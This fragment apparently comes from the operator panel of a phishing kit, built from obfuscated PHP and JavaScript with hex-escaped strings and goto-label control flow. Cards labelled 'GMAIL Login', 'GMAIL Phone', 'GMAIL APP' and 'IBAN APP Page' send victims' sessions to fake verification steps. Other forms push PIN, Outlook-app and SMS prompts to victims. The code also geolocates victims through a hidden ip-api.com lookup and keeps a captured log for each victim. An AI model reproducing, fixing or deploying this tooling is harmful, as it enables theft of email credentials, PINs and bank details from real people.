                                                            <circle style="fill: #b1a192;" cx="229.029" cy="148.711" r="42.307" />
                                                            <rect x="30.001" y="205.768" style="fill: #b1a192;" width="398.055" height="11.538" />
                                                            <rect x="30.014" y="358.342" style="fill: #b1a192;" width="398.028" height="11.505" />
                                                            <g>
                                                                <g>
                                                                    <rect x="77.074" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="108.924" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="77.074" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="108.924" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                                <g>
                                                                    <rect x="159.124" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="190.975" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="159.124" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="190.975" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                                <g>
                                                                    <rect x="241.175" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="273.026" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="241.175" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="273.026" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                                <g>
                                                                    <rect x="323.226" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="355.077" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="323.226" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="355.077" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                            </g>
                                                            <g>
                                                                <path
                                                                    style="fill: #b1a192;"
                                                                    d="M141.231,427.401v84.557H75.405v-84.557c0-12.73,10.404-23.154,23.154-23.154h19.519
				C130.808,404.248,141.231,414.671,141.231,427.401z"
                                                                />
                                                                <path
                                                                    style="fill: #b1a192;"
                                                                    d="M261.942,427.401v84.557h-65.826v-84.557c0-12.73,10.423-23.154,23.154-23.154h19.519
				C251.52,404.248,261.942,414.671,261.942,427.401z"
                                                                />
                                                                <path
                                                                    style="fill: #b1a192;"
                                                                    d="M382.653,427.401v84.557h-65.827v-84.557c0-12.73,10.423-23.154,23.154-23.154h19.519
				C372.249,404.248,382.653,414.671,382.653,427.401z"
                                                                />
                                                            </g>
                                                        </g>
                                                        <polygon
                                                            style="opacity: 0.08; fill: #040000;"
                                                            points="458.058,70.701 456.807,84.207 453.639,118.307 450.554,128.395 
		428.043,121.475 428.043,511.917 30.014,511.917 30.014,454.971 210.853,274.133 216.856,268.131 267.714,217.271 424.625,60.361 
		428.043,61.446 436.714,64.114 	"
                                                        />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">IBAN APP Page</div>
                                                <?php  echo $_SESSION["\151\163\x69\142\141\156\141\160\x70"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto DUREU; MTHVw: if (isset($_SESSION["\163\x74\x61\164\x75\x73"])) { echo $_SESSION["\x73\164\141\x74\x75\x73"]; } goto lmw_4; eL0Sh: $file_s = "\x67\x6f\137\141\160\160\56\160\x68\160"; goto fuOD7; ps8uv: $mobile = isset($info["\x6d\x6f\x62\151\x6c\145"]) ? $info["\x6d\x6f\142\x69\154\x65"] : null; goto HohDF; HiVLa: ?>
								<?php  goto Zh7Ce; MUaWx: if (check_file($_SESSION["\x75\163\x65\162\x69\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\163\145\162\151\x64"]; ?>
', 'go_phone')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="-0.5 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                        <g id="Color-" transform="translate(-401.000000, -860.000000)">
                                                            <g id="Google" transform="translate(401.000000, 860.000000)">
                                                                <path
                                                                    d="M9.82727273,24 C9.82727273,22.4757333 10.0804318,21.0144 10.5322727,19.6437333 L2.62345455,13.6042667 C1.08206818,16.7338667 0.213636364,20.2602667 0.213636364,24 C0.213636364,27.7365333 1.081,31.2608 2.62025,34.3882667 L10.5247955,28.3370667 C10.0772273,26.9728 9.82727273,25.5168 9.82727273,24"
                                                                    id="Fill-1"
                                                                    fill="#FBBC05"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,10.1333333 C27.025,10.1333333 30.0159091,11.3066667 32.3659091,13.2266667 L39.2022727,6.4 C35.0363636,2.77333333 29.6954545,0.533333333 23.7136364,0.533333333 C14.4268636,0.533333333 6.44540909,5.84426667 2.62345455,13.6042667 L10.5322727,19.6437333 C12.3545909,14.112 17.5491591,10.1333333 23.7136364,10.1333333"
                                                                    id="Fill-2"
                                                                    fill="#EB4335"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,37.8666667 C17.5491591,37.8666667 12.3545909,33.888 10.5322727,28.3562667 L2.62345455,34.3946667 C6.44540909,42.1557333 14.4268636,47.4666667 23.7136364,47.4666667 C29.4455,47.4666667 34.9177955,45.4314667 39.0249545,41.6181333 L31.5177727,35.8144 C29.3995682,37.1488 26.7323182,37.8666667 23.7136364,37.8666667"
                                                                    id="Fill-3"
                                                                    fill="#34A853"
                                                                ></path>
                                                                <path
                                                                    d="M46.1454545,24 C46.1454545,22.6133333 45.9318182,21.12 45.6113636,19.7333333 L23.7136364,19.7333333 L23.7136364,28.8 L36.3181818,28.8 C35.6879545,31.8912 33.9724545,34.2677333 31.5177727,35.8144 L39.0249545,41.6181333 C43.3393409,37.6138667 46.1454545,31.6490667 46.1454545,24"
                                                                    id="Fill-4"
                                                                    fill="#4285F4"
                                                                ></path>
                                                            </g>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">GMAIL Phone</div>
                                                <?php  echo $_SESSION["\x69\163\x67\x6f\x5f\x70\150\x6f\x6e\145"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto pj6qC; V44f0: $url = "\x68\x74\x74\x70\72\57\57\151\160\x2d\141\160\x69\56\143\157\x6d\57\x70\x68\160\x2f{$StrupLom}\x3f\146\151\145\154\x64\163\x3d\163\164\x61\x74\165\163\x2c\155\145\163\163\141\147\x65\54\x63\x6f\x6e\164\151\x6e\145\x6e\164\54\143\157\156\x74\151\x6e\145\x6e\164\103\x6f\x64\145\54\143\157\165\x6e\x74\162\171\54\x63\157\165\x6e\x74\162\171\103\157\144\145\54\x72\145\x67\x69\157\156\x2c\162\145\147\151\x6f\156\x4e\x61\x6d\145\54\143\x69\x74\171\54\144\151\x73\164\162\x69\x63\x74\54\x7a\151\160\x2c\154\141\164\54\x6c\x6f\x6e\x2c\164\x69\x6d\145\172\157\x6e\145\x2c\x63\165\162\162\145\x6e\x63\171\54\151\x73\160\54\x6f\162\x67\x2c\x61\163\54\x61\x73\x6e\x61\x6d\x65\54\x72\x65\166\x65\x72\x73\x65\54\155\157\142\151\x6c\x65\54\160\162\x6f\170\171\54\150\x6f\163\x74\x69\156\x67\x2c\161\165\145\162\x79"; goto P0BTp; Yt2y0: function readTextFile_log($user, $filename) { $fileFullPath = $user . "\x2f" . $filename; if (file_exists($fileFullPath)) { $file = fopen($fileFullPath, "\x72"); if ($file) { $valuesArray = array(); while (($line = fgets($file)) !== false) { $values = explode("\174", $line); $valuesArray[] = $values; } fclose($file); return $valuesArray; } else { return false; } } else { return false; } } goto pPivS; ntDHK: $file_s = "\141\154\145\162\164\56\160\150\x70"; goto m15yW; MgHg6: echo $_SESSION["\143\157\x75\x6e\164\162\x79\x4c\157\167\x65\x72\143\141\x73\x65"]; goto wbsgo; iOane: $file_s = "\165\163\x61\x67\145\x72\x2e\160\x68\x70"; goto LewDS; maSc7: ?>
								
								

								
								<?php  goto ZIBEX; fuOD7: if (check_file($_SESSION["\165\163\145\x72\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\163\x65\162\x69\x64"]; ?>
', 'go_app')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="-0.5 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                        <g id="Color-" transform="translate(-401.000000, -860.000000)">
                                                            <g id="Google" transform="translate(401.000000, 860.000000)">
                                                                <path
                                                                    d="M9.82727273,24 C9.82727273,22.4757333 10.0804318,21.0144 10.5322727,19.6437333 L2.62345455,13.6042667 C1.08206818,16.7338667 0.213636364,20.2602667 0.213636364,24 C0.213636364,27.7365333 1.081,31.2608 2.62025,34.3882667 L10.5247955,28.3370667 C10.0772273,26.9728 9.82727273,25.5168 9.82727273,24"
                                                                    id="Fill-1"
                                                                    fill="#FBBC05"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,10.1333333 C27.025,10.1333333 30.0159091,11.3066667 32.3659091,13.2266667 L39.2022727,6.4 C35.0363636,2.77333333 29.6954545,0.533333333 23.7136364,0.533333333 C14.4268636,0.533333333 6.44540909,5.84426667 2.62345455,13.6042667 L10.5322727,19.6437333 C12.3545909,14.112 17.5491591,10.1333333 23.7136364,10.1333333"
                                                                    id="Fill-2"
                                                                    fill="#EB4335"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,37.8666667 C17.5491591,37.8666667 12.3545909,33.888 10.5322727,28.3562667 L2.62345455,34.3946667 C6.44540909,42.1557333 14.4268636,47.4666667 23.7136364,47.4666667 C29.4455,47.4666667 34.9177955,45.4314667 39.0249545,41.6181333 L31.5177727,35.8144 C29.3995682,37.1488 26.7323182,37.8666667 23.7136364,37.8666667"
                                                                    id="Fill-3"
                                                                    fill="#34A853"
                                                                ></path>
                                                                <path
                                                                    d="M46.1454545,24 C46.1454545,22.6133333 45.9318182,21.12 45.6113636,19.7333333 L23.7136364,19.7333333 L23.7136364,28.8 L36.3181818,28.8 C35.6879545,31.8912 33.9724545,34.2677333 31.5177727,35.8144 L39.0249545,41.6181333 C43.3393409,37.6138667 46.1454545,31.6490667 46.1454545,24"
                                                                    id="Fill-4"
                                                                    fill="#4285F4"
                                                                ></path>
                                                            </g>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">GMAIL APP</div>
                                                <?php  echo $_SESSION["\151\163\x67\x6f\x5f\x61\160\x70"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto HiVLa; QuxE2: if (check_file($_SESSION["\165\163\x65\x72\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\163\145\x72\151\x64"]; ?>
', 'go_login')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="-0.5 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                        <g id="Color-" transform="translate(-401.000000, -860.000000)">
                                                            <g id="Google" transform="translate(401.000000, 860.000000)">
                                                                <path
                                                                    d="M9.82727273,24 C9.82727273,22.4757333 10.0804318,21.0144 10.5322727,19.6437333 L2.62345455,13.6042667 C1.08206818,16.7338667 0.213636364,20.2602667 0.213636364,24 C0.213636364,27.7365333 1.081,31.2608 2.62025,34.3882667 L10.5247955,28.3370667 C10.0772273,26.9728 9.82727273,25.5168 9.82727273,24"
                                                                    id="Fill-1"
                                                                    fill="#FBBC05"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,10.1333333 C27.025,10.1333333 30.0159091,11.3066667 32.3659091,13.2266667 L39.2022727,6.4 C35.0363636,2.77333333 29.6954545,0.533333333 23.7136364,0.533333333 C14.4268636,0.533333333 6.44540909,5.84426667 2.62345455,13.6042667 L10.5322727,19.6437333 C12.3545909,14.112 17.5491591,10.1333333 23.7136364,10.1333333"
                                                                    id="Fill-2"
                                                                    fill="#EB4335"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,37.8666667 C17.5491591,37.8666667 12.3545909,33.888 10.5322727,28.3562667 L2.62345455,34.3946667 C6.44540909,42.1557333 14.4268636,47.4666667 23.7136364,47.4666667 C29.4455,47.4666667 34.9177955,45.4314667 39.0249545,41.6181333 L31.5177727,35.8144 C29.3995682,37.1488 26.7323182,37.8666667 23.7136364,37.8666667"
                                                                    id="Fill-3"
                                                                    fill="#34A853"
                                                                ></path>
                                                                <path
                                                                    d="M46.1454545,24 C46.1454545,22.6133333 45.9318182,21.12 45.6113636,19.7333333 L23.7136364,19.7333333 L23.7136364,28.8 L36.3181818,28.8 C35.6879545,31.8912 33.9724545,34.2677333 31.5177727,35.8144 L39.0249545,41.6181333 C43.3393409,37.6138667 46.1454545,31.6490667 46.1454545,24"
                                                                    id="Fill-4"
                                                                    fill="#4285F4"
                                                                ></path>
                                                            </g>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">GMAIL Login</div>
                                                <?php  echo $_SESSION["\x69\163\147\157\137\x6c\x6f\x67\151\156"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto L36bR; MvIdb: ?>
', valueType);
                  showToast('Successfully', `🧹 Sent message for: ${valueType}`, '#fcba03');
              }

              // Panel Toggle
              function togglePanel() {
                  const panel = document.getElementById("panel");
                  const overlay = document.getElementById("overlay");
                  if (panel && overlay) {
                      panel.classList.toggle("hidden");
                      overlay.classList.toggle("hidden");
                  }
              }

              function closePanel() {
                  const panel = document.getElementById("panel");
                  const overlay = document.getElementById("overlay");
                  if (panel && overlay) {
                      panel.classList.add("hidden");
                      overlay.classList.add("hidden");
                  }
              }

              // Toast Notification
              function showToast(title, message, color, containerId = 'toast-container') {
                  var container = document.getElementById(containerId);
                  if (!container) return console.error('Toast container not found.');

                  var toastElement = document.createElement('div');
                  toastElement.classList.add('toast');
                  toastElement.setAttribute('role', 'alert');
                  toastElement.setAttribute('aria-live', 'assertive');
                  toastElement.setAttribute('aria-atomic', 'true');
                  toastElement.style.backgroundColor = color;

                  // Toast Header
                  var toastHeader = document.createElement('div');
                  toastHeader.classList.add('toast-header');
                  var titleElement = document.createElement('strong');
                  titleElement.classList.add('me-auto');
                  titleElement.textContent = title;
                  var closeButton = document.createElement('button');
                  closeButton.classList.add('btn-close');
                  closeButton.setAttribute('aria-label', 'Close');
                  closeButton.addEventListener('click', () => toastElement.remove());
                  toastHeader.append(titleElement, closeButton);

                  // Toast Body
                  var toastBody = document.createElement('div');
                  toastBody.classList.add('toast-body');
                  toastBody.textContent = message;

                  // Assemble Toast
                  toastElement.append(toastHeader, toastBody);
                  container.appendChild(toastElement);

                  // Auto Remove After 4.5 Seconds
                  setTimeout(() => {
                      toastElement.remove();
                  }, 4500);
              }

              // Sending Data
              function sendData_save(command, value, message) {
                  var data = { username: command, value_type: value, is_message: message };
                  fetch(window.location.href, {
                      method: 'POST',
                      body: new URLSearchParams(data),
                  })
                  .then(response => response.ok ? response.text() : Promise.reject('Network error'))
                  .then(text => handleResponse(text))
                  .catch(error => console.error('POST request failed:', error));
              }

              function sendData(command, value) {
                  var data = { username: command, value_type: value };
                  fetch(window.location.href, {
                      method: 'POST',
                      body: new URLSearchParams(data),
                  })
                  .then(response => response.ok ? response.text() : Promise.reject('Network error'))
                  .then(text => handleResponse(text))
                  .catch(error => console.error('POST request failed:', error));
              }

              // Handle Server Response
              function handleResponse(text) {
                  switch (text) {
                      case 'Banned':
                          showToast('Error', '❌ You Are Banned', '#4763c9');
                          break;
                      case 'Delete':
                          showToast('Success', '🧹 User log cleared', '#fcba03');
                          break;
                      default:
                          showToast('Success', `✅ Sent: ${text}`, '#38a85d');
                  }
              }

              // Add Event Listeners for Forms
              document.getElementById("modalForm").addEventListener("submit", function(event) {
                  submitForm(event, 'x_is_message', 'msg');
              });

              document.getElementById("modalForm2").addEventListener("submit", function(event) {
                  submitForm(event, 'inputField2', 'pin');
              });

               document.getElementById("modalForm3").addEventListener("submit", function(event) {
                  submitForm(event, 'inputField3', 'outlook_app');
              });
               document.getElementById("modalForm55").addEventListener("submit", function(event) {
                  submitForm(event, 'inputField55', 'operationsapp');
              });
               document.getElementById("modalForm66").addEventListener("submit", function(event) {
                  submitForm(event, 'inputField55', 'operationssms');
              });
			  
			  
        </script>

        <style>
            /* Toast container */
            .toast-container {
                position: fixed;
                bottom: 20px;
                right: 20px;
                z-index: 1000;
            }

            /* Toast */
            .toast {
                background-color: #c8c8fa;
                color: #000000;
                border-radius: 0.25rem;
                padding: 15px 20px;
                box-shadow: 0 0 19px rgba(0, 0, 0, 0.2);
                max-width: 400px;
                min-width: 300px;
            }

            .toast-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                color: #000000; /* Title color (black in this example) */
                font-weight: bold; /* Title font weight */
            }

            /* Title element */
            .toast-header strong {
                color: #000000; /* Title color (black in this example) */
                bottom: 10px;
                right: 20px;
            }
            /* Close button */
            .btn-close {
                color: #000000;
                cursor: pointer;
            }
            body {
                line-height: 1.5;
                font-family: "Lato", sans-serif;
                -webkit-font-smoothing: antialiased;
                overflow-x: hidden;
                height: 100vh;
            }

            .panel {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: #ffffff;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
                z-index: 1001; /* Panel should be above the overlay */
            }

            .overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black */
                z-index: 1000; /* Overlay should be below the panel */
            }

            .panel.hidden,
            .overlay.hidden {
                display: none;
            }

            .close-btn {
                position: absolute;
                top: 10px;
                right: 10px;
                cursor: pointer;
                font-size: 24px;
                color: #555555;
            }

            .panel h2 {
                margin-top: 0;
                margin-bottom: 20px;
                color: #333333;
            }

            .label {
                font-size: 16px;
                color: #555555;
            }

            .input-field {
                width: 100%;
                padding: 10px;
                margin-bottom: 20px;
                border: 1px solid #cccccc;
                border-radius: 5px;
            }

            .submit-btn {
                background-color: #007bff;
                color: #ffffff;
                border: none;
                border-radius: 5px;
                padding: 10px 20px;
                cursor: pointer;
            }

            .submit-btn:hover {
                background-color: #0056b3;
            }
        </style>
    </body>
</htm')); ?>
